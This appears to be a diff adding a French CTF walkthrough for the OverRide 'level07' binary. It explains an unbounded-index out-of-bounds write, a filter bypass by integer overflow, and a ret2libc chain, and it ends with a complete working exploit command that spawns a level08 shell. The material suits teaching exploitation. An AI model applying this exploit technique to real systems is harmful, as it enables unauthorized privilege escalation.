@@ -1,6 +1,172 @@
-./level07 <<'EOF'
-store
-<number>
-<index>
+# Level07 -- Walkthrough (evaluation)
+
+## 1. Objectif
+
+Obtenir un shell en tant que `level08` via le binaire `level07`.
+
+## 2. Comportement du programme
+
+Le binaire est un "number storage service" interactif :
+- **`store`** : ecrit un `unsigned int` a un index dans un tableau de 100 entiers sur la pile
+- **`read`** : lit un entier a un index donne
+- **`quit`** : sort de la boucle, `main` fait `return 0` (puis `ret`)
+
+Au demarrage, argv et environ sont effaces (memset).
+
+## 3. Protections
+
+| Protection | Etat | Impact |
+|-----------|------|--------|
+| **Canary** | Oui | Protege le cadre de pile -- ne pas ecraser l'index du canary |
+| **NX** | Active | Pas de shellcode sur la pile |
+| **PIE** | Non | Adresses du binaire fixes |
+| **RELRO** | Partiel | GOT partiellement protegee |
+
+## 4. Vulnerabilite : ecriture hors-bornes via index non borne
+
+`store_number` fait `tab[idx] = n` ou `idx` est un `unsigned int` fourni par l'utilisateur. Il n'y a **aucune verification** que `idx < 100`. Le seul filtre est :
+- `idx % 3 == 0` -> refuse
+- `(n >> 24) == 0xb7` -> refuse
+
+Ce filtre est **insuffisant** : on peut ecrire n'importe ou sur la pile (relatif au debut du tableau) en choisissant un index hors-bornes.
+
+## 5. Trouver l'offset reel du saved EIP
+
+Le calcul statique donnerait index 108 (offset 0x1b0), mais l'instruction `AND $0xfffffff0, %esp` dans `main` decale la pile de quelques octets selon l'alignement a l'entree. Il faut **mesurer** sur la VM.
+
+### Methode : `read` pour scanner la pile
+
+```text
+./level07
+read
+114
+read
+115
+read
+116
+```
+
+On cherche une valeur qui ressemble a une adresse `__libc_start_main` (typiquement `0xf7e4....`).
+
+### Resultat sur la VM
+
+```text
+data[114] = 4158936339  -> 0xf7e45513 (__libc_start_main+243)
+data[115] = 1           -> argc
+data[116] = 4294957028  -> 0xffffd7e4 (argv)
+```
+
+**Index 114** contient le saved EIP de `main` : c'est la cible.
+
+## 6. Contournement du filtre via integer overflow
+
+L'index **114** est bloque car `114 % 3 == 0`. L'adresse effective est calculee comme `tab + idx * 4` ou `idx * 4` est un `shl $0x2, %eax` en 32 bits : le resultat **wrappe** a 2^32.
+
+Formule : `idx = index_reel + k * 0x40000000` (pour k = 1, 2, 3...), choisir k tel que `idx % 3 != 0`.
+
+| Cible | Index reel | idx % 3 | Index overflow | k | idx % 3 |
+|-------|-----------|---------|----------------|---|---------|
+| **system** (EIP) | 114 | 0 (bloque) | **1073741938** | 1 | 1 |
+| **exit** (ret) | 115 | 1 (OK) | **1073741939** | 1 | 2 |
+| **/bin/sh** (arg) | 116 | 2 (OK) | **2147483764** | 2 | 1 |
+
+L'index direct 116 passe le filtre, mais on utilise k=2 (**2147483764**) pour rester coherent ; les deux marchent.
+
+Verification : `1073741938 * 4 mod 2^32 = 456 = 0x1c8 = 114 * 4`. CQFD.
+
+## 7. Strategie : ret2libc
+
+Le binaire est i386 sans `system` dans ses imports. On utilise la **libc deja chargee** :
+1. **`system`** -> saved EIP : quand `main` fait `ret`, il saute dans `system`
+2. **`exit`** -> adresse de retour apres `system` : sortie propre
+3. **`"/bin/sh"`** -> argument de `system` (convention d'appel i386 cdecl)
+
+Les adresses libc sur OverRide sont en `0xf7...` : l'octet haut est `0xf7`, pas `0xb7` -> le filtre ne bloque pas.
+
+## 8. Mesure des adresses (GDB sur la VM)
+
+```text
+gdb -q ./level07
+break main
+run
+p system
+p exit
+find &system, +9999999, "/bin/sh"
 quit
-EOF
+```
+
+Resultat :
+
+| Symbole | Hex | Decimal |
+|---------|-----|---------|
+| **system** | `0xf7e6aed0` | **4159090384** |
+| **exit** | `0xf7e5eb70` | **4159040368** |
+| **"/bin/sh"** | `0xf7f897ec` | **4160264172** |
+
+### Comment convertir hex -> decimal
+
+Dans le **shell** (pas dans GDB) :
+
+```bash
+printf '%u\n' 0xf7e6aed0
+```
+
+Dans **GDB** (guillemets doubles) :
+
+```text
+printf "%u\n", 0xf7e6aed0
+```
+
+**Python** :
+
+```bash
+python -c "print(0xf7e6aed0)"
+```
+
+## 9. Exploit
+
+```bash
+( echo "store" ; echo "4159090384" ; echo "1073741938" ; echo "store" ; echo "4159040368" ; echo "1073741939" ; echo "store" ; echo "4160264172" ; echo "2147483764" ; echo "quit" ; cat ) | ./level07
+```
+
+Quand `main` execute `ret`, la pile contient :
+
+```
+  [esp]   -> 0xf7e6aed0  (system)
+  [esp+4] -> 0xf7e5eb70  (exit)
+  [esp+8] -> 0xf7f897ec  ("/bin/sh")
+```
+
+-> `system("/bin/sh")` -> **shell**.
+
+Le **`; cat`** apres les `echo` maintient stdin ouvert pour interagir avec le shell obtenu.
+
+## 10. Note sur le canary
+
+Le canary se trouve quelque part entre l'index 100 et 114. Nos ecritures ciblent uniquement les index **114, 115, 116** (via overflow). On **ne touche pas** le canary : `__stack_chk_fail` ne se declenche pas.
+
+## 11. Schema memoire (pile, adresses croissantes vers le haut)
+
+```
+        +------------------+
+        |   "/bin/sh" ptr  |  index 116  (argument de system)
+        +------------------+
+        |   exit@libc      |  index 115  (adresse de retour)
+        +------------------+
+        |   system@libc    |  index 114  (saved EIP = cible)
+        +------------------+
+        |   saved EBP      |  index 113
+        +------------------+
+        |   canary          |  index ~106
+        +------------------+
+        |   ...             |
+        +------------------+
+        | storage[99]       |  index 99
+        |   ...             |
+        | storage[0]        |  index 0  (esp+0x24)
+        +------------------+
+```
+
+## 12. Conclusion (oral)
+
+Le level07 exploite une **ecriture hors-bornes** sur un tableau d'entiers non signe : l'index n'est pas borne a [0, 99]. Le filtre `idx % 3 == 0` est contourne par **integer overflow** sur `idx * 4` (32-bit wrap). On ecrit une **ret2libc frame** (`system` / `exit` / `"/bin/sh"`) par-dessus le saved EIP de `main`, sans toucher le canary. Les adresses libc en `0xf7...` passent le filtre `!= 0xb7`. L'offset reel du saved EIP (index **114**, pas 108) est mesure via la commande `read` du programme lui-meme, car l'alignement `AND $0xfffffff0, %esp` decale la pile.
